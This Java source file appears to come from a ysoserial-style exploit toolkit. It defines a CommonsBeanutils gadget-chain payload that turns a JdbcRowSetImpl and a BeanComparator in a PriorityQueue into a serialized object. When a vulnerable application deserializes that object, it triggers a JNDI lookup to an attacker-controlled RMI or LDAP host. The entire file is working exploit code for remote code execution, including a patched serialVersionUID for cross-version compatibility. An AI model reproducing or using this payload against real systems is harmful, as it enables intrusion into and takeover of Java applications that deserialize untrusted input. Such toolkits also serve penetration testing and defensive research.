package org.su18.ysuserial.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.SuClassLoader;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import static org.su18.ysuserial.payloads.util.Gadgets.insertField;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils3183 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		} else {
			throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
		}

		ClassPool pool = ClassPool.getDefault();
		pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		Reflections.setFieldValue(comparator, "property", null);
		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

		JdbcRowSetImpl rs = new JdbcRowSetImpl();
		rs.setDataSourceName(jndiURL);
		rs.setMatchColumn("su18");
		PriorityQueue queue = new PriorityQueue(2, comparator);

		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));
		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});

		ctBeanComparator.defrost();
		return queue;
	}
}
